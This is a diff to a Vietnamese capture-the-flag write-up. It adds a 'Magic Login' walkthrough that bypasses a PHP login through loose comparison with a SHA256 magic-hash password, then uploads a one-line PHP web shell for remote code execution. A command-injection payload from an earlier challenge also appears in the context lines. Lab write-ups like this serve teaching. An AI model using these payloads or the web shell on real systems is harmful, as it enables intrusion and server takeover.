@@ -33,6 +33,7 @@
 - [The Existed File](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#the-existed-file)
 - [Simple Blind SQL Injection](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#simple-blind-sql-injection)
 - [Ethical Ping Pong Club](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#ethical-ping-pong-club)
+- [Magic Login]()
 ### HTTP Request Content-Length
 Challenge:
 
@@ -911,6 +912,71 @@ Trang web:
 Là 1 thử thách command injection, tôi sử dụng payload `127.0.0.1%0acat%09/fla?.txt` và tìm được flag:
 
 ![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image163.png?raw=true)
+### Magic Login
+
+![img](164)
+
+Trang web:
+
+![img](165)
+
+Xem source page:
+
+    <html>
+        <form action="verify.php" method="post"> 
+            User Name:<br> 
+            <input type="text" name="username"><br><br> 
+            Password:<br> 
+            <input type="password" name="password"><br><br> 
+            <input type="submit" name="submit" value="Login"> 
+        </form>
+        <!--
+        if(isset($_POST['submit'])){ 
+            $usr = mysql_real_escape_string($_POST['username']); 
+            $pas = hash('sha256', mysql_real_escape_string($_POST['password'])); 
+            
+            if($pas == "0"){ 
+                $_SESSION['logged'] = TRUE; 
+                header("Location: upload.php"); // Modify to go to the page you would like 
+                exit; 
+            }else{ 
+                header("Location: login_page.php"); 
+                exit; 
+            } 
+        }else{    //If the form button wasn't submitted go to the index page, or login page 
+            header("Location: login_page.php");     
+            exit; 
+        } 
+        --> 
+    </html>
+
+Có vẻ trang web đã có cách phòng chống lỗ hổng SQLi, tuy nhiên có thể thấy `$pas == "0"`:
+- Trong PHP, khi so sánh với == (không phải ===): `0e12345` == `0` => `true`
+- Đây là lỗ hổng `PHP collision`. Tôi phải tìm một password sao cho khi băm SHA256 ra kết quả bắt đầu bằng `0e...` và toàn số. Những password này được gọi là SHA256 magic hash.
+
+Khi search SHA256 magic hash PHP collision tôi tìm được payload từ trang [github](https://github.com/spaze/hashes/blob/master/sha256.md). 
+
+Tiếp theo tôi thử `username:password` là `admin:34250003024812` thì vào được trang `/upload.php`:
+
+![img](166)
+
+Tại đây tôi thử tạo 1 RCE `shell.php` đơn giản: 
+
+    <?php system($_GET['cmd']); ?>
+
+Upload file này lên website:
+
+![img](167)
+
+Click vào `File` và thực hiện RCE:
+
+![img](168)
+
+=> RCE thành công. Tiếp theo đọc file /flag.txt và tìm được flag:
+
+![img](169)
+
+
 
 
 
